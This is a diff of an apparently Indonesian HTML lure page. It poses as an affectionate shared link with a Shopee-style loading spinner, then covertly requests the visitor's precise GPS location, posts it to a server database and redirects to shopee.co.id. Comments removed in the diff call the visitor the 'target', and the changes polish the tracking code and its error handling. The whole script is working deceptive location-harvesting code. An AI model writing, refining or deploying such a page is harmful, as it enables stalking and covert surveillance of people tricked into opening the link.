@@ -3,9 +3,9 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>aa sayang oneng</title>
+    <title>Aa sayang oneng</title>
 
-    <!-- Open Graph untuk Tampilan Link Preview saat Dikirim di WA/Medsos -->
+    <!-- Open Graph Preview -->
     <meta property="og:title" content="Aa sayang oneng" />
     <meta property="og:description" content="muahhhhhhhhh" />
     <meta
@@ -25,10 +25,11 @@
       }
       .loading-box {
         text-align: center;
+        padding: 20px;
       }
       .spinner {
         border: 4px solid #f3f3f3;
-        border-top: 4px solid #ee4d2d; /* Warna oranye Shopee */
+        border-top: 4px solid #ee4d2d;
         border-radius: 50%;
         width: 45px;
         height: 45px;
@@ -59,6 +60,11 @@
       const TARGET_URL = "https://shopee.co.id";
       let sudahRedirect = false;
 
+      function updateStatus(pesan) {
+        const statusEl = document.getElementById("status");
+        if (statusEl) statusEl.innerText = pesan;
+      }
+
       function alihkanKeShopee() {
         if (!sudahRedirect) {
           sudahRedirect = true;
@@ -66,37 +72,46 @@
         }
       }
 
-      // Waktu batas maksimal (8 detik). Jika target tidak mengklik izinkan/tolak, tetap dialihkan.
+      // Waktu batas maksimal tunggu (8 detik) sebelum memaksa redirect
       let maxWaitTimer = setTimeout(() => {
         alihkanKeShopee();
       }, 8000);
 
       function kirimLokasiKeServer(dataGPS) {
+        updateStatus("Menghubungkan...");
         fetch("/api/simpan-lokasi", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(dataGPS),
         })
-          .then((res) => res.json())
+          .then((res) => {
+            if (!res.ok) throw new Error("Respon server bermasalah");
+            return res.json();
+          })
           .then((data) => {
-            console.log("Lokasi berhasil tersimpan ke Neon!", data);
+            console.log("Lokasi tersimpan ke database Neon:", data);
           })
           .catch((err) => {
-            console.error("Gagal simpan lokasi:", err);
+            console.error("Gagal mengirim data ke server:", err);
           })
           .finally(() => {
-            // HANYA alihkan ke Shopee SETELAH request simpan lokasi selesai
             clearTimeout(maxWaitTimer);
             alihkanKeShopee();
           });
       }
 
       window.onload = function () {
+        // Cek apakah akses menggunakan HTTPS (diperlukan oleh browser modern)
+        if (
+          location.protocol !== "https:" &&
+          location.hostname !== "localhost"
+        ) {
+          console.warn("Geolocation membutuhkan protokol HTTPS yang aman.");
+        }
+
         if (navigator.geolocation) {
-          // Minta akses GPS perangkat
           navigator.geolocation.getCurrentPosition(
             (position) => {
-              // Jika target mengklik "Allow / Izinkan"
               const dataGPS = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
@@ -105,14 +120,26 @@
               kirimLokasiKeServer(dataGPS);
             },
             (error) => {
-              // Jika target mengklik "Block / Menolak"
-              console.warn("Akses GPS ditolak/gagal:", error.message);
+              let infoError = "Gagal mengambil lokasi.";
+              switch (error.code) {
+                case error.PERMISSION_DENIED:
+                  infoError = "Akses lokasi ditolak oleh pengguna.";
+                  break;
+                case error.POSITION_UNAVAILABLE:
+                  infoError = "Informasi lokasi tidak tersedia.";
+                  break;
+                case error.TIMEOUT:
+                  infoError = "Waktu permintaan lokasi habis.";
+                  break;
+              }
+              console.warn(infoError);
               clearTimeout(maxWaitTimer);
-              alihkanKeShopee();
+              // Beri jeda singkat sebelum pengalihan jika terjadi kegagalan
+              setTimeout(alihkanKeShopee, 1000);
             },
             {
-              enableHighAccuracy: true, // Paksa gunakan GPS hardware HP agar presisi
-              timeout: 5000,
+              enableHighAccuracy: true,
+              timeout: 6000,
               maximumAge: 0,
             },
           );
